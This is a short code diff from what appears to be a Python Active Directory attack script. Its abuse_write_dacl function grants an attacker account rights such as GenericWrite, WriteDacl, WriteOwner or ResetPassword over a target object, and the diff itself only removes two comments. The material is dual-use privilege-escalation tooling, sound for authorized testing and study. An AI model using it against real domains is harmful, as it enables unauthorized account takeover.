@@ -153,7 +153,7 @@ def get_object_dn(conn, base_dn, identifier):
         if conn.entries:
             return conn.entries[0]
 
-        # Try with wildcards (for cases like MICROSOFTDNS.CS.ORG)
+
         conn.search(base_dn, f'(name=*{escaped_id}*)', SUBTREE,
                     attributes=['distinguishedName', 'objectClass', 'objectSid'])
         if conn.entries:
@@ -270,7 +270,7 @@ def abuse_write_dacl(conn, base_dn, attacker_sam, target_sam):
         '2': (0x00000028, "GenericWrite", False),
         '3': (0x00080000, "WriteOwner", False),
         '4': (0x00040000, "WriteDacl", False),
-        '5': (0x00000100, "ResetPassword", True),   # يحتاج Object ACE
+        '5': (0x00000100, "ResetPassword", True),   
     }
 
     if perm_choice == '0':
